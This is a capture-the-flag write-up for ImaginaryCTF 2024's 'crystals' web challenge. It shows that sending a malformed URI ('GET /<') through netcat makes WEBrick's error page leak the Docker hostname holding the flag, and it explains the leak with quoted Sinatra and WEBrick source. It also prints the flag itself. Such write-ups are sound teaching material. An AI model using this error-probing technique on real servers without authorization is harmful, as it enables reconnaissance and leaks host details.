# crystals

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 145 solves / 100 points
- Author: @FIREPONY57
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Al₂O₃

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240722143508.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/images/Pasted%20image%2020240722143523.png)

In here, we can see that this website is the TV series "Breaking Bad" fan page. However, there's not much we can do in here.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/ImaginaryCTF-2024/Web/crystals/crystals_release.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/crystals)-[2024.07.22|14:36:55(HKT)]
└> file crystals_release.zip 
crystals_release.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/crystals)-[2024.07.22|14:36:57(HKT)]
└> unzip crystals_release.zip 
Archive:  crystals_release.zip
  inflating: Dockerfile              
   creating: app/
  inflating: app/run.sh              
   creating: app/views/
  inflating: app/views/index.erb     
  inflating: app/app.rb              
   creating: conf/
  inflating: conf/nginx.conf         
  inflating: docker-compose.yml      
```

After reading the source code of this web application a little bit, we have the following findings:

1. This web application is written in Ruby, with web application framework "[Sinatra](https://sinatrarb.com/)"
2. The only route in this web application is just `/`

Now, what's our objective in this challenge? Where's the flag?

In the `docker-compose.yml` file, we can see that the flag is in the Docker container's **hostname**!

```yaml
version: '3.3'
services:
  deployment:
    hostname: $FLAG
    build: .
    ports:
      - 10001:80
```

Huh? So, we'll need to **somehow leak the hostname** in this web application?

Based on my experience, a web application is possible to have **information exposure via error messages**.

For instance, we can send a malformed request to trigger an error, then maybe the server respond us with a very verbose error message.

## Exploitation

**To do so, we can send a malformed request, such as this request:**
```http
GET /< HTTP/1.1
Host: crystals.chal.imaginaryctf.org
```

The server will try to parse the path. However, since this path `/<` is not a valid path, it should causes an error.

```shell
┌[siunam♥Mercury]-(~/ctf/ImaginaryCTF-2024/Web/crystals)-[2024.07.22|15:15:59(HKT)]
└> nc crystals.chal.imaginaryctf.org 80                                                             
GET /< HTTP/1.1
Host: crystals.chal.imaginaryctf.org

HTTP/1.1 400 Bad Request
Server: nginx
Date: Mon, 22 Jul 2024 07:16:06 GMT
Content-Type: text/html; charset=ISO-8859-1
Content-Length: 316
Connection: keep-alive

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
<HTML>
  <HEAD><TITLE>Bad Request</TITLE></HEAD>
  <BODY>
    <H1>Bad Request</H1>
    bad URI `/&lt;'.
    <HR>
    <ADDRESS>
     WEBrick/1.8.1 (Ruby/3.0.2/2021-07-07) at
     ictf{seems_like_you_broke_it_pretty_bad_76a87694}:4567
    </ADDRESS>
  </BODY>
</HTML>
```

Nice! We got the flag!

But wait, why? What caused this?

In the `<ADDRESS>` element, we can see `WEBrick/1.8.1`.

Huh, **WEBrick**?

> WEBrick is an HTTP server toolkit that can be configured as an HTTPS server, a proxy server, and a virtual-host server. - [https://github.com/ruby/webrick?tab=readme-ov-file#webrick](https://github.com/ruby/webrick?tab=readme-ov-file#webrick)

So, WEBrick is an HTTP server written in Ruby.

Does Sinatra host the HTTP server with WEBrick?

In Sinatra's [`lib/sinatra/base.rb` at line 1602 - 1621](https://github.com/sinatra/sinatra/blob/main/lib/sinatra/base.rb#L1602-L1621), we can see that Sinatra uses Puma, Falcon, or WEBrick to host the HTTP server.

```ruby
# Run the Sinatra app as a self-hosted server using
# Puma, Falcon, or WEBrick (in that order). If given a block, will call
# with the constructed handler once we have taken the stage.
def run!(options = {}, &block)
  unless defined?(Rackup::Handler)
    rackup_warning = <<~MISSING_RACKUP
      Sinatra could not start, the "rackup" gem was not found!

      Add it to your bundle with:

          bundle add rackup

      or install it with:

          gem install rackup

    MISSING_RACKUP
    warn rackup_warning
    exit 1
  end
```

In Ruby's [Rack](https://github.com/rack/rack), it provides a modular interface between web servers and web applications, and [Rackup](https://github.com/rack/rackup) is to provide a command line interface for running a Rack-compatible application.

Then, at [line 1966](https://github.com/sinatra/sinatra/blob/main/lib/sinatra/base.rb#L1966), it seems like by default, Sinatra uses WEBrick?

```ruby
set :server, %w[HTTP webrick]
```

Now, in [WEBrick's `lib/webrick/httprequest.rb`](https://github.com/ruby/webrick/blob/master/lib/webrick/httprequest.rb#L227), we can see that when it failed to parse the request's URL, it'll raise an exception:

```ruby
[...]
begin
  setup_forwarded_info
  @request_uri = parse_uri(@unparsed_uri)
  @path = HTTPUtils::unescape(@request_uri.path)
  @path = HTTPUtils::normalize_path(@path)
  @host = @request_uri.host
  @port = @request_uri.port
  @query_string = @request_uri.query
  @script_name = ""
  @path_info = @path.dup
rescue
  raise HTTPStatus::BadRequest, "bad URI `#{@unparsed_uri}'."
end
[...]
```

Then, in [`lib/webrick/httpresponse.rb` at line 405 function `set_error`](https://github.com/ruby/webrick/blob/master/lib/webrick/httpresponse.rb#L405), it creates an error page for exception:

```ruby
def set_error(ex, backtrace=false)
  case ex
  when HTTPStatus::Status
    @keep_alive = false if HTTPStatus::error?(ex.code)
    self.status = ex.code
  else
    @keep_alive = false
    self.status = HTTPStatus::RC_INTERNAL_SERVER_ERROR
  end
  @header['content-type'] = "text/html; charset=ISO-8859-1"

  if respond_to?(:create_error_page)
    create_error_page()
    return
  end

  if @request_uri
    host, port = @request_uri.host, @request_uri.port
  else
    host, port = @config[:ServerName], @config[:Port]
  end

  error_body(backtrace, ex, host, port)
end
```

In [function `error_body`](https://github.com/ruby/webrick/blob/master/lib/webrick/httpresponse.rb#L443), we can see that the response body contains a verbose message, such as web server's hostname:

```ruby
def error_body(backtrace, ex, host, port)
  @body = +""
  @body << <<-_end_of_html_
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
<HTML>
<HEAD><TITLE>#{HTMLUtils::escape(@reason_phrase)}</TITLE></HEAD>
<BODY>
<H1>#{HTMLUtils::escape(@reason_phrase)}</H1>
#{HTMLUtils::escape(ex.message)}
<HR>
  _end_of_html_

  if backtrace && $DEBUG
    @body << "backtrace of `#{HTMLUtils::escape(ex.class.to_s)}' "
    @body << "#{HTMLUtils::escape(ex.message)}"
    @body << "<PRE>"
    ex.backtrace.each{|line| @body << "\t#{line}\n"}
    @body << "</PRE><HR>"
  end

  @body << <<-_end_of_html_
<ADDRESS>
 #{HTMLUtils::escape(@config[:ServerSoftware])} at
 #{host}:#{port}
</ADDRESS>
</BODY>
</HTML>
  _end_of_html_
end
```

Now we know why the hostname is included in the response body when we send a malformed URL!

- **Flag: `ictf{seems_like_you_broke_it_pretty_bad_76a87694}`**

## Conclusion

What we've learned:

1. Information disclosure in WEBrick